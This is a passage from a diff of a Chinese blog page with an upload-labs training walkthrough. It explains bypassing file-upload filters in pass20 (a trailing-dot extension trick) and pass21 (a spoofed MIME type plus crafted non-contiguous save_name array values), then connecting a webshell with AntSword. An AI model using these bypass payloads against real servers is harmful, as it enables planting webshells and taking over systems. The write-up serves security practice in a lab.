+<p>pathinfo() 纯粹基于输入字符串操作，它不会受实际文件系统和类似 “..” 的路径格式影响。 我们可以利用这点，把.php的后缀改成”.php. ”，这样返回的后缀就会绕过后缀检查，而多出来的”. “，就会被windows系统的文件名特性忽略掉，从而成功上传文件。</p>
+<p>（2）修改保存的名称</p>
+<p><img src="https://s2.loli.net/2022/03/11/6S3jRhMQC4m5eK2.png" alt="图片.png"></p>
+<p>（3）用蚁剑连接</p>
+<h2 id="pass21"><a href="#pass21" class="headerlink" title="pass21"></a>pass21</h2><p>（1）提示</p>
+<pre><code>if(!empty($_FILES[&#39;upload_file&#39;]))&#123;
+    //检查MIME
+    $allow_type = array(&#39;image/jpeg&#39;,&#39;image/png&#39;,&#39;image/gif&#39;);
+    if(!in_array($_FILES[&#39;upload_file&#39;][&#39;type&#39;],$allow_type))&#123;
+        $msg = &quot;禁止上传该类型文件!&quot;;
+    &#125;else&#123;
+        //检查文件名，检查&#39;save_name&#39;的值是否为空，如果为空则flie的值为上传文件的名字，否则为&#39;save_name&#39;的值。
+        $file = empty($_POST[&#39;save_name&#39;]) ? $_FILES[&#39;upload_file&#39;][&#39;name&#39;] : $_POST[&#39;save_name&#39;]; 
+        if (!is_array($file)) &#123; 
+         //如果file的值不是数组，使用explode函数用“.”分割$file的值为两部分，其返回值是数组。
+         //strtolower函数则是使file的值转化为小写。
+            $file = explode(&#39;.&#39;, strtolower($file));
+        &#125;
+
+        $ext = end($file); //end()取file数组的最后一行
+        $allow_suffix = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);
+        if (!in_array($ext, $allow_suffix)) &#123;
+            $msg = &quot;禁止上传该后缀文件!&quot;;
+        &#125;else&#123;
+        //reset函数是使指向$file的指针，重返初始位置，并返回第一个的值
+        //count — 计算数组中的单元数目
+            $file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1];
+        //$_FILES[&quot;file&quot;][&quot;tmp_name&quot;] - 存储在服务器的文件的临时副本的名称
+            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+            $img_path = UPLOAD_PATH . &#39;/&#39; .$file_name;
+            if (move_uploaded_file($temp_file, $img_path)) &#123;
+                $msg = &quot;文件上传成功！&quot;;
+                $is_upload = true;
+        ……
+</code></pre>
+<p>首先要绕过MIME的检查，这个我们通过bp抓包修改Content-Type:的值就可以了。然后savename的值如果不是数组则会被拆为数组，那不妨我们直接构造一个数组传给file。</p>
+<p>同时我们可以利用php数组下标不不为连续数问题（可详细参考这篇博客）</p>
+<p>传入：</p>
+<p>save_name[0]=1.php</p>
+<p>save_name[2]=jpg</p>
+<p>这样save_name[2]=jpg用于绕过后缀检查，而count函数计算出来的值为2，所以$file[count($file) - 1]也就是$file[1]的返回值为空，最后$img_path的值也就为1.php.，在通过windows的文件名特性会忽略掉最后的“.”，就成功上传了</p>
+<p><img src="https://s2.loli.net/2022/03/11/yvu34oeIB1MJgil.png" alt="图片.png"></p>
+<p>（2）用蚁剑连接</p>
 
     
 
@@ -304,7 +686,7 @@
         </li>
         <li>
           <strong>本文链接：</strong>
-          <a href="http://example.com/2022/02/22/GXYCTF2019_BabyUpload/" title="[GXYCTF2019]BabyUpload" target="_blank">http://example.com/2022/02/22/GXYCTF2019_BabyUpload/</a>
+          <a href="http://example.com/2022/03/03/upload-labs/" title="upload_labs" target="_blank">http://example.com/2022/03/03/upload-labs/</a>
         </li>
         
         <li>
@@ -326,7 +708,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">题目</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">靶场</a>
         		</li>
       		
 		</ul>
@@ -382,7 +764,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-     <!-- <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2022/02/22/GXYCTF2019_BabyUpload/" alt="微信分享二维码"> -->
+     <!-- <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2022/03/03/upload-labs/" alt="微信分享二维码"> -->
     </div>
 </div>
 
@@ -397,18 +779,18 @@
 
 <nav id="article-nav">
   
-    <a href="/2022/02/23/%5BSUCTF%202019%5DEasySQL/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2022/03/11/php%E6%95%B0%E7%BB%84%E4%B8%8D%E4%B8%BA%E8%BF%9E%E7%BB%AD%E6%95%B0%E9%97%AE%E9%A2%98/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          [SUCTF 2019]EasySQL
+          php数组不为连续数问题
         
       </div>
     </a>
   
   
-    <a href="/2022/02/22/sql%E6%B3%A8%E5%85%A5-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">sql注入--堆叠注入</div>
+    <a href="/2022/02/23/%5BSUCTF%202019%5DEasySQL/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">[SUCTF 2019]EasySQL</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -435,7 +817,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#GXYCTF2019-BabyUpload"><span class="toc-number">1.</span> <span class="toc-text">[GXYCTF2019]BabyUpload</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#upload-labs"><span class="toc-number">1.</span> <span class="toc-text">upload_labs</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#pass1"><span class="toc-number">1.1.</span> <span class="toc-text">pass1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass2"><span class="toc-number">1.2.</span> <span class="toc-text">pass2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass3"><span class="toc-number">1.3.</span> <span class="toc-text">pass3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass4"><span class="toc-number">1.4.</span> <span class="toc-text">pass4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass5"><span class="toc-number">1.5.</span> <span class="toc-text">pass5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass6"><span class="toc-number">1.6.</span> <span class="toc-text">pass6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass7"><span class="toc-number">1.7.</span> <span class="toc-text">pass7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass8"><span class="toc-number">1.8.</span> <span class="toc-text">pass8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass9"><span class="toc-number">1.9.</span> <span class="toc-text">pass9</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass10"><span class="toc-number">1.10.</span> <span class="toc-text">pass10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass11"><span class="toc-number">1.11.</span> <span class="toc-text">pass11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass12"><span class="toc-number">1.12.</span> <span class="toc-text">pass12</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass13"><span class="toc-number">1.13.</span> <span class="toc-text">pass13</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass14"><span class="toc-number">1.14.</span> <span class="toc-text">pass14</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass15"><span class="toc-number">1.15.</span> <span class="toc-text">pass15</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass16"><span class="toc-number">1.16.</span> <span class="toc-text">pass16</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass17"><span class="toc-number">1.17.</span> <span class="toc-text">pass17</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass18"><span class="toc-number">1.18.</span> <span class="toc-text">pass18</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass19"><span class="toc-number">1.19.</span> <span class="toc-text">pass19</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass20"><span class="toc-number">1.20.</span> <span class="toc-text">pass20</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass21"><span class="toc-number">1.21.</span> <span class="toc-text">pass21</span></a></li></ol></li></ol>
                     </div>
                 </span>
             </div>
